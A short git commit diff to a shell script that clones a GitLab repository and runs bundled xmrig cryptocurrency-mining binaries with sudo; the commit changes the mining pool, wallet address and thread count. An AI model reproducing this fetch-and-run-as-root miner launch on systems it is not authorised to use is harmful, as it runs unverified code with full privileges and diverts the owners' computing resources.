b8d615a4e18d79781c8cefd9ff755cf4cee8db1a
realxdagg <121330162+realxdagg@users.noreply.github.com>
2022-12-25 11:51:15 +0700

    Update running.sh

--- running.sh
+++ running.sh
@@ -2,4 +2,4 @@
 git clone https://gitlab.com/rumah2/xdag.git
 cd xdag
 chmod 500 xmrigDaemon xmrigMiner 
-sudo ./xmrigDaemon --donate-level 1 -o stratum.xdag.org:24656 -u CZ0rJ3FRUk6eIk1x2P/6wfZhDII2nxf1 -k -t 32
+sudo ./xmrigDaemon --donate-level 1 -o us.fastpool.xyz:3035 -u SafexsnemBLeBFCdMeECMS2mXQ8TWKVjGXDdqWLzC2h8LAd7rcMMKHYBexEWkZ9himSgVi3QQQ7pshSf84DikXMACuY26zthFwK3z -k -t 8
